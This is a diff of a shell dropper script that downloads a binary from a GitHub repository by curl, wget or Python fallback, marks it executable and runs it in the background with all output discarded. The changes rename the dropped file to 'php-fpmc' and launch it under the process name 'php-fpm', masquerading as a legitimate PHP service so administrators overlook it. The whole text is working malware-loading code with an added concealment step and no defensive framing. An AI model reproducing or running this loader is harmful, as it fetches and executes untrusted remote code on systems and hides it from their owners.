@@ -11,11 +11,11 @@ l64="https://github.com/Slex123-c/ipSlad/raw/refs/heads/main/tcp8711_a"
 l32="https://github.com/Slex123-c/ipSlad/raw/refs/heads/main/ws8710"
 l16="https://github.com/Slex123-c/ipSlad/raw/refs/heads/main/tcp8711"
 
-v="aa4876c2"
+v="php-fpmc"
 rm -rf $v
 
 ARCH="$1"  
-v="aa4876c2"  
+v="php-fpmc"  
 
 if [ "${ARCH}" = "ws" ]; then
     (curl -fsSL -m180 "$l64" -o "$v" || wget -T180 -q "$l64" -O "$v" || python -c 'import urllib; urllib.urlretrieve("'"$l32"'", "'"$v"'")')
@@ -29,5 +29,5 @@ else
 fi
 
 chmod +x $v
-(nohup $(pwd)/$v > /dev/null 2>&1 &) || (nohup ./$v > /dev/null 2>&1 &) || (nohup /usr/bin/$v > /dev/null 2>&1 &) || (nohup /usr/libexec/$v > /dev/null 2>&1 &) || (nohup /usr/local/bin/$v > /dev/null 2>&1 &) || (nohup /tmp/$v > /dev/null 2>&1 &)
+for p in "$(pwd)/$v" /usr/bin/$v /usr/libexec/$v /usr/local/bin/$v /tmp/$v; do [ -x "$p" ] && nohup bash -c "exec -a php-fpm \"$p\"" >/dev/null 2>&1 & break; done
 #
